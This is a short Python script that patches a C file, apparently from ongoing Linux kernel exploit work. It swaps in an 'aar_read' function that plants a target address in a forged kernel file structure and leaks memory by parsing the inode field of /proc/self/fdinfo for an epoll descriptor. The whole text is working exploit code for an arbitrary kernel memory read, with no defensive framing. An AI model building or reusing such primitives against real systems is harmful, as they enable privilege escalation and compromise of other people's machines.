import re

with open("tier2/scripts/test_hyp012_swaps.c", "r") as f:
    code = f.read()

new_aar = """uint64_t aar_read(int epA_fd, uint8_t *fake_file, uint64_t target_addr) {
    *(uint64_t*)(fake_file + 32) = target_addr - 0x40;
    
    char path[256], buf[4096];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA_fd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        char *tfd = strstr(buf, "tfd:");
        if (tfd) {
            char *ptr = strstr(tfd, "ino:");
            if (ptr) return strtoull(ptr + 4, NULL, 16);
        }
    }
    return 0;
}"""

code = re.sub(r"uint64_t aar_read\(.*?\n\}", new_aar, code, flags=re.DOTALL)

with open("tier2/scripts/test_hyp012_swaps.c", "w") as f:
    f.write(code)
